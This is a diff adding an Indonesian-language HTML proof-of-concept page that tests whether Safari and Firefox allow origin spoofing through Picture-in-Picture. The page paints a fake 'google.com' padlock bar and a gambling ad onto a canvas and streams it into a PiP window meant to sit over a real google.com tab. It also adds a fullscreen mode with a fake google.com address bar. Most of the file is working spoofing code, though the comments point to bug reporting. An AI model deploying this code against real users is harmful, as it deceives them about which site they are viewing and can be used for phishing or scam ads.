@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>PoC Safari PiP - GIF Model (iOS + macOS)</title>
+<style>
+  *{box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:12px;background:#000;color:#fff}
+  .hdr{background:#1c1c1e;padding:12px;border-radius:12px;margin-bottom:10px}
+  .warn{background:#332500;border:1px solid #ff9f0a;padding:10px;border-radius:10px;margin:10px 0;color:#ffd8a8;font-size:13px}
+  .ok{background:#0e2a14;border:1px solid #30d158;padding:10px;border-radius:10px;margin:10px 0;color:#b8ffcf;font-size:13px}
+  button{width:100%;padding:16px;border-radius:12px;border:0;font-size:17px;font-weight:700;margin:7px 0}
+  .p{background:#0a84ff;color:#fff} .s{background:#30d158;color:#000} .d{background:#ff453a;color:#fff}
+  canvas{width:100%;border-radius:12px;border:2px solid #333;display:block}
+  video{width:100%;border-radius:12px;display:none;background:#111;border:2px solid #0a84ff}
+  #log{font-family:ui-monospace,monospace;font-size:11px;background:#111;border:1px solid #333;border-radius:8px;padding:8px;max-height:220px;overflow:auto;white-space:pre-wrap}
+  code{color:#64d2ff}
+  .big{font-size:14px;line-height:1.4}
+</style>
+</head>
+<body>
+
+<div class="hdr">
+<b>PoC Safari PiP - GIF Model</b><br>
+<span class="big">Firefox: <code>canvas.captureStream() → requestPictureInPicture()</code> tanpa gesture di video = BOLONG tanpa origin<br>
+Safari: butuh <b>tap langsung di video</b> + <code>webkitSetPresentationMode</code> - GIF model diblokir</span><br>
+Origin: <code id="orig"></code> | UA: <code id="ua" style="font-size:10px"></code>
+</div>
+
+<div class="warn">
+<b>Kenapa beda sama Firefox?</b> Safari iOS/macOS blokir PiP kalau stream dari canvas + tombol luar. Harus user gesture <b>di video element itu sendiri</b>. Ini mitigasi Safari yang tidak ada di Firefox (temuan lu).
+</div>
+
+<canvas id="c" width="960" height="540"></canvas>
+<video id="v" playsinline webkit-playsinline controls muted></video>
+
+<button class="p" onclick="init()">1. INIT Canvas (gambar SLOT GACOR + fake google.com)</button>
+<button class="p" id="btnTap" onclick="alert('JANGAN klik tombol ini di iOS! TAP LANGSUNG DI VIDEO DI ATAS')">2. iOS: TAP LANGSUNG DI VIDEO (bukan tombol) untuk PiP</button>
+<button class="p" onclick="pipFallback()">2b. macOS/Desktop fallback: Request PiP via tombol (untuk test macOS)</button>
+<button class="s" onclick="goFS()">3. Fallback Fullscreen Spoof (hoki iOS - address bar hilang)</button>
+<button class="d" onclick="openGoogle()">4. Open google.com _blank (test persist PiP di atas google.com)</button>
+
+<div class="ok" id="instr">Status: belum init</div>
+<div id="log">Log:
+</div>
+
+<div id="fakeBar" style="display:none;position:fixed;top:0;left:0;right:0;background:#f8f8f8;color:#000;padding:6px 10px;z-index:999999;border-bottom:1px solid #ccc;font-size:14px"><span style="color:#34c759">🔒</span> <b>google.com</b> — Video Highlight - Bola • SLOT GACOR 2026</div>
+
+<script>
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var stream=null;
+document.getElementById('orig').textContent=location.origin;
+document.getElementById('ua').textContent=navigator.userAgent;
+function log(m){ var l=document.getElementById('log'); l.textContent+='\n'+new Date().toLocaleTimeString()+' '+m; l.scrollTop=l.scrollHeight; }
+
+function draw(){
+  ctx.fillStyle='#ffffff'; ctx.fillRect(0,0,960,70);
+  ctx.fillStyle='#000'; ctx.font='bold 22px -apple-system,sans-serif'; ctx.fillText('🔒 google.com • Video Highlight - Bola',16,45);
+  ctx.fillStyle='#ff0033'; ctx.fillRect(0,70,960,470);
+  ctx.fillStyle='#ffff00'; ctx.fillRect(24,96,912,96);
+  ctx.fillStyle='#000'; ctx.font='900 40px sans-serif'; ctx.textAlign='center'; ctx.fillText('SLOT GACOR 2026 - MAXWIN x1000',480,158);
+  ctx.textAlign='left';
+  ctx.fillStyle='#fff'; ctx.font='bold 26px sans-serif'; ctx.fillText('RTP 98.7% • Klik Daftar Sekarang!',40,250);
+  ctx.fillStyle='#00ff7f'; ctx.fillRect(40,280,300,64); ctx.fillStyle='#000'; ctx.fillText('DAFTAR',140,322);
+  var t=Date.now()/150; ctx.fillStyle='rgba(255,255,255,.7)'; for(let i=0;i<6;i++){ let x=(t*28 + i*170)%960; ctx.fillRect(x,380,70,10); }
+  requestAnimationFrame(draw);
+}
+draw();
+
+function init(){
+  try{
+    if(c.captureStream) stream=c.captureStream(30);
+    else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30);
+    else { log('FAIL captureStream tidak support'); return; }
+    v.srcObject=stream;
+    v.style.display='block';
+    c.style.display='none';
+    v.muted=true;
+    v.play().then(()=>{
+      log('OK init: canvas.captureStream()->video.play()');
+      document.getElementById('instr').innerHTML='INIT OK - Sekarang <b style=color:#ff9f0a>TAP LANGSUNG DI VIDEO</b> di atas! iOS hanya izinkan PiP kalau gesture di video, bukan tombol luar. (Firefox bolong: tombol luar aja bisa)';
+      document.getElementById('instr').style.background='#332500';
+      log('PETUNJUK iOS: Tap langsung di area video (bukan tombol 2)!');
+    }).catch(e=>log('play fail: '+e));
+  }catch(e){ log('init fail: '+e); }
+}
+
+v.addEventListener('click', ()=>{ log('VIDEO clicked (gesture)'); doPiP(true); });
+v.addEventListener('touchend', ()=>{ setTimeout(()=>{ log('VIDEO touchend (gesture)'); doPiP(true); },80); });
+
+async function pipFallback(){ doPiP(false); }
+
+async function doPiP(isGestureOnVideo){
+  if(!stream){ log('Belum init! Klik 1 dulu'); return; }
+  try{
+    if(v.webkitSetPresentationMode){
+      log('Call webkitSetPresentationMode PiP gestureOnVideo='+isGestureOnVideo);
+      v.webkitSetPresentationMode('picture-in-picture');
+      log('webkitSetPresentationMode called, tunggu event webkitpresentationmodechanged');
+    } else if(v.requestPictureInPicture){
+      log('Call requestPictureInPicture() gestureOnVideo='+isGestureOnVideo);
+      await v.requestPictureInPicture();
+      log('SUCCESS PiP OK - cek origin tooltip! Firefox tanpa tooltip = BUG, Chrome/Safari ada tooltip = mitigated');
+    } else log('PiP API tidak ada');
+  }catch(e){
+    log('PiP FAILED: '+e.name+' '+e.message+' gestureOnVideo='+isGestureOnVideo);
+    if(e.name==='NotAllowedError'){
+      log('=> SAFARI BLOKIR GIF MODEL! Ini mitigasi Safari yang TIDAK ADA di Firefox. Buat Bugzilla: Safari blocks, Firefox allows - proves security boundary');
+      log('=> Coba fallback Fullscreen tombol 3 - itu hoki di iOS');
+    }
+  }
+}
+
+function goFS(){
+  var el=document.documentElement;
+  var p=null;
+  if(el.requestFullscreen) p=el.requestFullscreen();
+  else if(el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); p=Promise.resolve(); }
+  else { log('Fullscreen tidak support'); return; }
+  if(p) p.then(()=>{
+    document.getElementById('fakeBar').style.display='flex';
+    log('FULLSCREEN OK - fakeBar google.com muncul, address bar asli hilang (iOS hoki)');
+  }).catch(e=>log('FS fail '+e));
+}
+function openGoogle(){ window.open('https://google.com','_blank'); log('open google.com'); }
+
+v.addEventListener('webkitpresentationmodechanged', ()=>log('EVENT webkitpresentationmodechanged mode='+v.webkitPresentationMode));
+document.addEventListener('webkitfullscreenchange', ()=>log('EVENT webkitfullscreenchange'));
+document.addEventListener('fullscreenchange', ()=>{ if(!document.fullscreenElement) document.getElementById('fakeBar').style.display='none'; });
+</script>
+</body>
+</html>
